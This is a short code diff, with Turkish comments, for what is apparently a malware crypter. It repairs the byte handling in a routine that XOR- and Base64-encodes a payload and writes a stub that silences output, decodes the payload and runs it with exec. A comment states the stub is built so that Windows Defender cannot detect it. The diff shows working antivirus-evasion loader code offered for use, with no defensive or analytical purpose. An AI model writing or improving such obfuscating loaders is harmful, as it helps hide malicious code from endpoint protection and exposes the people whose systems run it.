@@ -375,7 +375,9 @@ _r()
         # XOR + Base64 şifreleme (derleme zamanında)
         import random, string
         xkey = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-        enc_bytes = bytes([ord(c) ^ ord(xkey[i % len(xkey)]) for i, c in enumerate(payload_code)])
+        xkey_bytes = xkey.encode('utf-8')
+        payload_bytes = payload_code.encode('utf-8')
+        enc_bytes = bytes([payload_bytes[i] ^ xkey_bytes[i % len(xkey_bytes)] for i in range(len(payload_bytes))])
         enc_b64 = base64.b64encode(enc_bytes).decode()
         
         # Stub: sadece decoder + exec — Defender bunu algılayamaz
@@ -385,9 +387,9 @@ if sys.stdout is None:
 if sys.stderr is None:
     sys.stderr=open(os.devnull,"w")
 import base64 as _b
-_k="{xkey}"
+_k=b"{xkey}"
 _d=_b.b64decode("{enc_b64}")
-_c="".join(chr(_d[i]^ord(_k[i%len(_k)])) for i in range(len(_d)))
+_c=bytes([_d[i]^_k[i%len(_k)] for i in range(len(_d))]).decode("utf-8")
 exec(_c)
 """
         save_text(stub_path, stub_code)
